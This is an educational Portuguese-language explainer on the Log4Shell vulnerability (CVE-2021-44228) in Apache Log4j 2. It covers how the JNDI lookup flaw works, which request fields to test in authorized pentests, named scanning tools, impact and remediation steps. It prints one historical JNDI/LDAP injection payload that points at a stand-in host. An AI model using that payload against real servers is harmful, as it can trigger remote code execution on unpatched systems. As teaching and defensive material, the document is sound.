# ☕ Log4j / Log4Shell

## 🧠 O que é a falha Log4j?

**Log4j** é uma biblioteca Java utilizada para registrar eventos e mensagens (_logs_) em aplicações.

**Log4Shell** é o nome dado à vulnerabilidade crítica **CVE-2021-44228**, descoberta em 2021 em versões vulneráveis do **Apache Log4j 2**.

A falha estava relacionada ao processamento de determinadas entradas controladas pelo usuário pelo mecanismo de _lookup_ do Log4j.

Em aplicações vulneráveis, uma entrada especialmente criada poderia fazer com que o servidor realizasse uma solicitação para um recurso externo e, em determinados cenários, possibilitar **execução remota de código (RCE)**.

---

## ⚙️ Como funciona?

Um cenário simplificado:

```text
Atacante
   │
   │ Entrada controlada
   ▼
Aplicação Java
   │
   ▼
Log4j vulnerável
   │
   │ Processamento da entrada
   ▼
Requisição externa
   │
   ▼
Servidor controlado pelo atacante
```

A entrada maliciosa poderia aparecer em diversos lugares que fossem registrados pela aplicação, como:

```text
Headers HTTP
User-Agent
Parâmetros
Campos de formulário
Cookies
Mensagens
```

Um exemplo histórico de payload utilizava a sintaxe:

```text
${jndi:ldap://example.com/a}
```

📌 **Não é simplesmente "colocar código Java no log".** A vulnerabilidade estava na forma como o Log4j processava determinadas expressões e integrações JNDI.

---

## 💥 Impacto

Dependendo da versão, configuração e ambiente, a exploração poderia levar a:

```text
Log4Shell
    │
    ├── Requisição externa
    ├── Divulgação de informações
    └── RCE
          │
          ├── Execução de comandos
          ├── Acesso a dados
          └── Comprometimento do servidor
```

Por isso, a vulnerabilidade recebeu **CVSS 10.0 (Crítica)**.

O impacto real, entretanto, depende da versão do Log4j e da configuração da aplicação.

---

## 🔎 Onde procurar?

Durante um pentest autorizado, procure entradas que sejam posteriormente registradas pela aplicação:

```text
User-Agent
X-Forwarded-For
Referer
Parâmetros GET/POST
Campos de login
Cookies
```

O ponto importante é:

```text
Entrada do usuário
       ↓
Aplicação
       ↓
Log4j
       ↓
Processamento vulnerável
```

---

## 🛠️ Ferramentas

Algumas ferramentas foram desenvolvidas para auxiliar na **detecção** e pesquisa da vulnerabilidade:

```text
log4j-scanner
log4j-shell-poc
```

O ideal é utilizar essas ferramentas somente em sistemas próprios ou explicitamente autorizados.

---

## 🔐 Correção

As principais medidas são:

1. **Atualizar o Log4j** para uma versão corrigida;
2. Identificar todas as aplicações que utilizam versões vulneráveis;
3. Atualizar dependências transitivas;
4. Monitorar tentativas de exploração;
5. Restringir conexões de saída desnecessárias;
6. Reavaliar sistemas que possam ter sido expostos durante o período vulnerável.

---

## 📌 Resumo

```text
Log4j
  │
  └── Biblioteca de logging Java
          │
          ▼
      Log4Shell
      CVE-2021-44228
          │
          ▼
 Processamento inseguro de JNDI
          │
          ▼
    RCE em determinados cenários
```

> **Log4Shell é uma vulnerabilidade crítica do Apache Log4j 2 que podia transformar uma entrada controlada pelo usuário em uma interação JNDI, podendo resultar em execução remota de código em ambientes vulneráveis.**